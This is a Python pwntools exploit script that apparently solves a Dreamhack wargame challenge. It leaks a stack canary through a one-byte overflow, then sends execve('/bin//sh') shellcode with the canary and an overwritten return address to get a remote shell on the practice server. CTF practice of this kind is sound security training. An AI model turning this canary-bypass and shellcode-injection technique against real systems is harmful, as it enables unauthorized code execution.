from pwn import *

context.arch = "amd64"

p = remote("host3.dreamhack.games", 10205)

p.recvuntil(b"Address of the buf: ")
buf = int(p.recvuntil(b"\n", drop=True), 16)

p.recvuntil(b"Distance between buf and $rbp: ")
distance = int(p.recvuntil(b"\n", drop=True), 10)
distance -= 8

payload = b"A" * (distance + 1) 
p.sendafter(b"Input: ", payload)

p.recvuntil(payload)
canary_bytes = b"\x00" + p.recvn(7)

shellcode = asm("""
    xor rax, rax
    mov rbx, 0x68732f2f6e69622f		/* python3 -c "from pwn import *; print(hex(u64('/bin//sh')))" */
    push rax
    push rbx 
    
    mov rax, 0x3b
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    
    syscall
""")

payload = shellcode + b"A" * (distance - len(shellcode))
payload += canary_bytes
payload += b"A" * 8
payload += p64(buf)

p.sendlineafter(b"Input: ", payload)

p.interactive()
